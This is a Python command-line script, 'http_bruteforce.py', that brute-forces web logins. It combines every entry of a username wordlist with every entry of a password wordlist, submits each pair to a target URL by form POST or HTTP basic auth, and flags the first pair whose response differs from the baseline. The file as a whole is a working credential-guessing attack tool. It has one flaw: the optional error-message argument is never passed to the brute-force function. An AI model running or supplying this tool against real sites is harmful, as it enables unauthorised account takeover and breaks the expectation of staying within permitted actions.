#http_bruteforce.py

import requests
import argparse
from termcolor import colored 


def parse_arguments():
    parser = argparse.ArgumentParser(description='HTTP Bruteforce Script')

    parser.add_argument('-x', '--usrwordlist', required=True, help='Path to the usernames wordlist file')
    parser.add_argument('-y', '--pwdwordlist', required=True, help='Path to the passwords wordlist file')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-u', '--username', required=True, help='Username Parameter')
    parser.add_argument('-p', '--password', required=True, help='Password Parameter')
    parser.add_argument('-m', '--method', required=True, choices=['get', 'post'], help='HTTP method [get or post]')
    parser.add_argument('-e', '--error', required=False, help='Error Message')

    return parser.parse_args()

def banner(usr_wordlist,pwd_wordlist, target, method, user, passwd,error=''):
    text = '''
_  _ ___ ___ ___           ___  ____ _  _ ___ ____ ____ ____ ____ ____ ____ 
|__|  |   |  |__]    __    |__] |__/ |  |  |  |___ |___ |  | |__/ |    |___ 
|  |  |   |  |             |__] |  \ |__|  |  |___ |    |__| |  \ |___ |___ 
                                                                            v1.0'''
    
    print(colored(text,'yellow'))
    print('\n')
    print(colored('URL:','white'),colored(target,'yellow',attrs=['bold']))
    print(colored('HTTP Method:','white'),colored(method.upper(),'green',attrs=['bold']))
    print(colored('Username Parameter:','white'),colored(user,'cyan',attrs=['bold']))
    print(colored('Password Parameter:','white'),colored(passwd,'cyan',attrs=['bold']))
    print(colored('Error Message:','white'),colored(error,'red',attrs=['bold']))
    print(colored('Usernames Wordlist:','white'),colored(usr_wordlist,'blue',attrs=['bold']))
    print(colored('Passwords Wordlist:','white'),colored(pwd_wordlist,'blue',attrs=['bold']))
    print("_"*60)
    print("\n")


def create_data_list(usr_wordlist, pwd_wordlist, user, passwd):
    data = []
    with open(usr_wordlist, 'r') as file:
        usernames = [line.strip() for line in file]
    with open(pwd_wordlist, 'r') as file:
        passwords = [line.strip() for line in file]

    for username in usernames:
        for password in passwords:
            data.append({user: username, passwd: password})

    return data



def bruteforce(usr_wordlist,pwd_wordlist, target, method, user, passwd,error=''):
    found = 0
    data_list = create_data_list(usr_wordlist,pwd_wordlist, user, passwd)
    old_resp = requests.get(target).text
    if error == '':
        for i in data_list:
            
            if method == 'post':
                response = requests.post(target, data=i)
            elif method == 'get':
                tup = (i[user], i[passwd])
                response = requests.get(target, auth=tup)
            new_resp = response.text
            print(f"Trying credentials ==> [{i[user]}:{i[passwd]}]")
            if old_resp != new_resp:
                print(colored(f"Valid credentials ==> [{i[user]}:{i[passwd]}]", 'green', attrs=['bold']))
                found = 1
                break
            else:
                continue

    else:
        for i in data_list:
            
            if method == 'post':
                response = requests.post(target, data=i)
            elif method == 'get':
                tup = (i[user], i[passwd])
                response = requests.get(target, auth=tup)
            new_resp = response.text
            print(f"Trying credentials ==> [{i[user]}:{i[passwd]}]")
            if old_resp != new_resp and error not in new_resp:
                print(colored(f"Valid credentials ==> [{i[user]}:{i[passwd]}]", 'green', attrs=['bold']))
                found = 1
                break
            else:
                continue

    if found == 0:  
        print(colored("No Credentials found",'red',attrs=['bold']))



def main():
    args = parse_arguments()

    # Access the arguments
    usr_wordlist = args.usrwordlist
    pwd_wordlist = args.pwdwordlist
    target_url = args.target
    http_method = args.method
    username = args.username
    password = args.password
    error = args.error

    
    banner(usr_wordlist,pwd_wordlist,target_url, http_method, username, password,error)
    bruteforce(usr_wordlist,pwd_wordlist,target_url, http_method, username, password)

if __name__ == '__main__':
    main()
